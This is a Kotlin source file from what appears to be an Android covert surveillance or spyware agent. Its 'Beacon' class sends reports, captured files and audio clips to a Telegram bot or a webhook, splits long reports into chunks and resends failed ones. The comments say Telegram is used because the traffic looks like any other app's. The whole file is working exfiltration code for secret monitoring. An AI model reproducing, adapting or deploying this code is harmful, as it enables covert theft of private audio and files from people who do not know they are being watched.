package com.mobilesvc.agent

import org.json.JSONObject

/**
 * Reporting channel.
 *
 * Telegram is the default because it needs no server, no domain, and no certificate: the traffic
 * is HTTPS to `api.telegram.org`, which is indistinguishable from any other app. The trade is
 * that the bot token lives inside the APK and is extractable by anyone who unpacks it — treat
 * every token as burned the moment the file leaves your hands.
 *
 * Messages are capped at 4096 characters by the Bot API. Long reports are split on line
 * boundaries rather than truncated, so a report never loses its tail silently.
 */
class Beacon(private val config: PayloadConfig) {

    private val pending = ArrayDeque<String>()

    fun send(text: String): Boolean {
        if (!config.canReport) return false
        var ok = false
        when (config.transport) {
            "TELEGRAM" -> ok = sendTelegram(text)
            "WEBHOOK" -> ok = sendWebhook(text)
            else -> ok = sendTelegram(text) || sendWebhook(text)
        }
        if (!ok) {
            // Keep the last few failures so the next successful cycle can flush them.
            pending.addLast(text)
            while (pending.size > 20) pending.removeFirst()
        } else if (pending.isNotEmpty()) {
            val backlog = pending.toList()
            pending.clear()
            backlog.forEach { sendTelegram(it) }
        }
        return ok
    }

    private fun sendTelegram(text: String): Boolean {
        if (config.telegramToken.isBlank() || config.telegramChatId.isBlank()) return false
        var allOk = true
        split(text).forEach { chunk ->
            val body = "chat_id=${Net.encode(config.telegramChatId)}" +
                "&text=${Net.encode(chunk)}" +
                "&disable_web_page_preview=true"
            val response = Net.request(
                url = "https://api.telegram.org/bot${config.telegramToken}/sendMessage",
                method = "POST",
                body = body.toByteArray(Charsets.UTF_8),
                contentType = "application/x-www-form-urlencoded",
                timeoutMs = 20_000
            )
            if (response.status !in 200..299) allOk = false
        }
        return allOk
    }

    private fun sendWebhook(text: String): Boolean {
        if (!config.webhookUrl.startsWith("https://")) return false
        val json = JSONObject().apply {
            put("agent", "oversight")
            put("at", System.currentTimeMillis())
            put("report", text)
        }
        return Net.postJson(config.webhookUrl, json.toString()).status in 200..299
    }

    /** Uploads a binary artifact — an audio clip, a captured file — as a document. */
    fun sendDocument(fileName: String, mime: String, bytes: ByteArray, caption: String = ""): Boolean {
        if (!config.canReport) return false
        if (config.transport == "WEBHOOK") return false // webhook carries text only
        if (config.telegramToken.isBlank() || config.telegramChatId.isBlank()) return false

        val response = Net.postMultipart(
            url = "https://api.telegram.org/bot${config.telegramToken}/sendDocument" +
                "?chat_id=${Net.encode(config.telegramChatId)}" +
                (if (caption.isNotBlank()) "&caption=${Net.encode(caption.take(1000))}" else ""),
            field = "document",
            fileName = fileName,
            mime = mime,
            bytes = bytes
        )
        return response.status in 200..299
    }

    /** Splits on newlines so a chunk boundary never lands mid-token. */
    internal fun split(text: String, limit: Int = 3900): List<String> {
        if (text.length <= limit) return listOf(text)
        val out = mutableListOf<String>()
        val builder = StringBuilder()
        text.lineSequence().forEach { line ->
            if (builder.length + line.length + 1 > limit) {
                if (builder.isNotEmpty()) {
                    out += builder.toString()
                    builder.setLength(0)
                }
                if (line.length > limit) {
                    line.chunked(limit).forEach { out += it }
                    return@forEach
                }
            }
            builder.append(line).append('\n')
        }
        if (builder.isNotEmpty()) out += builder.toString().trimEnd()
        return out
    }
}
